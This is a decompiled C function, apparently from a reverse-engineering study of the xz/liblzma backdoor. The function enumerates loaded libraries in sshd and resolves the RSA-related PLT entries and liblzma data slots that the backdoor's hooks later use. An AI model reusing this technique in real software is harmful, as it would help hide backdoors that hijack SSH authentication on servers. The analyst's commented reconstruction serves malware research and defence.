// /home/kali/xzre-ghidra/xzregh/104660_process_shared_libraries_map.c
// Function: process_shared_libraries_map @ 0x104660
// Calling convention: __stdcall
// Prototype: BOOL __stdcall process_shared_libraries_map(link_map * r_map, backdoor_shared_libraries_data_t * data)


/*
 * AutoDoc: Walks `r_debug->r_map` and classifies each entry by basename, aborting on duplicates or malformed maps. Only after locating sshd
 * (the main binary), libcrypto, ld-linux, libsystemd, liblzma, and libc does it parse the ELF images: sshd’s PLT is interrogated
 * to recover `RSA_public_decrypt`, `EVP_PKEY_set1_RSA`, and `RSA_get0_key`, liblzma’s RW data segment is recorded so the
 * `backdoor_hooks_data_t` blob and `hooks_data_addr` can be cached, libcrypto/libc descriptors are primed for later walkers, and
 * libc’s import table is filled via `resolve_libc_imports`. The result is a fully-populated `backdoor_shared_libraries_data_t` for
 * downstream stages.
 */

#include "xzre_types.h"

BOOL process_shared_libraries_map(link_map *r_map,backdoor_shared_libraries_data_t *data)

{
  char name_char;
  void **rsa_get0_key_slot;
  void **evp_set1_rsa_slot;
  void **rsa_public_decrypt_slot;
  elf_info_t *elf_info;
  link_map *map_cursor;
  backdoor_data_t *shared_maps;
  backdoor_hooks_data_t **hooks_data_addr_ptr;
  EncodedStringId basename_id;
  BOOL success;
  Elf64_Sym *rtld_global_sym;
  uchar *rtld_global_ptr;
  ulong *plt_entry;
  void *hooks_blob;
  char *soname_cursor;
  char *basename_ptr;
  u64 liblzma_data_segment_size;
  
  if (r_map == (link_map *)0x0) {
    return FALSE;
  }
  rtld_global_sym = elf_symbol_get(data->elf_handles->dynamic_linker,STR_rtld_global,0);
  if (rtld_global_sym == (Elf64_Sym *)0x0) {
    return FALSE;
  }
  do {
    if (*(ulong *)(r_map + 0x18) == 0) {
      shared_maps = data->shared_maps;
      if (shared_maps->main_map == (link_map *)0x0) {
        return FALSE;
      }
      if (shared_maps->libcrypto_map == (link_map *)0x0) {
        return FALSE;
      }
      if (shared_maps->dynamic_linker_map == (link_map *)0x0) {
        return FALSE;
      }
      if (shared_maps->libsystemd_map == (link_map *)0x0) {
        return FALSE;
      }
      if (shared_maps->liblzma_map == (link_map *)0x0) {
        return FALSE;
      }
      if (shared_maps->libc_map == (link_map *)0x0) {
        return FALSE;
      }
      break;
    }
    if (*(ulong *)r_map == 0) {
      return FALSE;
    }
    soname_cursor = *(char **)(r_map + 8);
    if (soname_cursor == (char *)0x0) {
      return FALSE;
    }
    if (*(ulong *)(r_map + 0x10) == 0) {
      return FALSE;
    }
    basename_ptr = soname_cursor;
    if (*soname_cursor == '\0') {
      if (data->shared_maps->main_map != (link_map *)0x0) {
        return FALSE;
      }
      data->shared_maps->main_map = r_map;
    }
    else {
      while (name_char = *soname_cursor, name_char != '\0') {
        soname_cursor = soname_cursor + 1;
        if (name_char == '/') {
          basename_ptr = soname_cursor;
        }
      }
      basename_id = get_string_id(basename_ptr,soname_cursor);
      shared_maps = data->shared_maps;
      if (basename_id == STR_libc_so) {
        if (shared_maps->libc_map != (link_map *)0x0) {
          return FALSE;
        }
        shared_maps->libc_map = r_map;
      }
      else if (basename_id < 0x7d1) {
        if (basename_id == STR_liblzma_so) {
          if (shared_maps->liblzma_map != (link_map *)0x0) {
            return FALSE;
          }
          if (0x10465f < *(ulong *)r_map) {
            return FALSE;
          }
          if ((code *)(*(ulong *)r_map + 0x400000) < process_shared_libraries_map) {
            return FALSE;
          }
          if (*(ulong *)(r_map + 0x18) == 0) {
            return FALSE;
          }
          shared_maps->liblzma_map = r_map;
        }
        else if (basename_id == STR_libcrypto_so) {
          if (shared_maps->libcrypto_map != (link_map *)0x0) {
            return FALSE;
          }
          shared_maps->libcrypto_map = r_map;
        }
      }
      else if (basename_id == STR_libsystemd_so) {
        if (shared_maps->libsystemd_map != (link_map *)0x0) {
          return FALSE;
        }
        shared_maps->libsystemd_map = r_map;
      }
      else if (basename_id == STR_ld_linux_x86_64_so) {
        if (shared_maps->dynamic_linker_map != (link_map *)0x0) {
          return FALSE;
        }
        elf_info = data->elf_handles->dynamic_linker;
        rtld_global_ptr = elf_info->elfbase->e_ident + rtld_global_sym->st_value;
        if (r_map <= rtld_global_ptr) {
          return FALSE;
        }
        if (rtld_global_sym->st_size < (ulong)((long)r_map - (long)rtld_global_ptr)) {
          return FALSE;
        }
        if (*(Elf64_Dyn **)(r_map + 0x10) != elf_info->dynamic_segment) {
          return FALSE;
        }
        shared_maps->dynamic_linker_map = r_map;
      }
    }
    shared_maps = data->shared_maps;
    r_map = *(link_map **)(r_map + 0x18);
  } while ((((shared_maps->main_map == (link_map *)0x0) || (shared_maps->libcrypto_map == (link_map *)0x0)) ||
           (shared_maps->dynamic_linker_map == (link_map *)0x0)) ||
          (((shared_maps->libsystemd_map == (link_map *)0x0 || (shared_maps->liblzma_map == (link_map *)0x0))
           || (shared_maps->libc_map == (link_map *)0x0))));
  rsa_get0_key_slot = data->rsa_get0_key_slot;
  evp_set1_rsa_slot = data->evp_set1_rsa_slot;
  rsa_public_decrypt_slot = data->rsa_public_decrypt_slot;
  elf_info = data->elf_handles->main;
  map_cursor = data->shared_maps->main_map;
  if (map_cursor == (link_map *)0x0) {
    return FALSE;
  }
  success = elf_parse(*(Elf64_Ehdr **)map_cursor,elf_info);
  if (success == FALSE) {
    return FALSE;
  }
  if (elf_info->gnurelro_present == FALSE) {
    return FALSE;
  }
  if ((elf_info->feature_flags & 0x20) == 0) {
    return FALSE;
  }
  plt_entry = (ulong *)elf_get_plt_symbol(elf_info,STR_RSA_public_decrypt);
  *rsa_public_decrypt_slot = plt_entry;
  if (plt_entry < (ulong *)0x1000000) {
    plt_entry = (ulong *)elf_get_plt_symbol(elf_info,STR_EVP_PKEY_set1_RSA);
    *evp_set1_rsa_slot = plt_entry;
    if (((ulong *)0xffffff < plt_entry) && (0xffffff < *plt_entry)) {
      return FALSE;
    }
    plt_entry = (ulong *)elf_get_plt_symbol(elf_info,STR_RSA_get0_key);
    *rsa_get0_key_slot = plt_entry;
    if (plt_entry < (ulong *)0x1000000) goto LAB_00104924;
  }
  if (0xffffff < *plt_entry) {
    return FALSE;
  }
LAB_00104924:
  map_cursor = data->shared_maps->libcrypto_map;
  if ((map_cursor != (link_map *)0x0) &&
     (success = elf_parse(*(Elf64_Ehdr **)map_cursor,data->elf_handles->libcrypto), success != FALSE)) {
    hooks_data_addr_ptr = data->hooks_data_slot;
    liblzma_data_segment_size = 0;
    elf_info = data->elf_handles->liblzma;
    map_cursor = data->shared_maps->liblzma_map;
    if ((map_cursor != (link_map *)0x0) &&
       (((success = elf_parse(*(Elf64_Ehdr **)map_cursor,elf_info), success != FALSE &&
         ((elf_info->feature_flags & 0x20) != 0)) &&
        (hooks_blob = elf_get_data_segment(elf_info,&liblzma_data_segment_size,TRUE), 0x597 < liblzma_data_segment_size)))) {
      *hooks_data_addr_ptr = (backdoor_hooks_data_t *)((long)hooks_blob + 0x10);
      *(u64 *)((long)hooks_blob + 0x590) = liblzma_data_segment_size - 0x598;
      map_cursor = data->shared_maps->libc_map;
      if ((map_cursor != (link_map *)0x0) &&
         (success = elf_parse(*(Elf64_Ehdr **)map_cursor,data->elf_handles->libc), success != FALSE)) {
        success = resolve_libc_imports
                           (data->shared_maps->libc_map,data->elf_handles->libc,data->libc_imports);
        return (uint)(success != FALSE);
      }
    }
  }
  return FALSE;
}

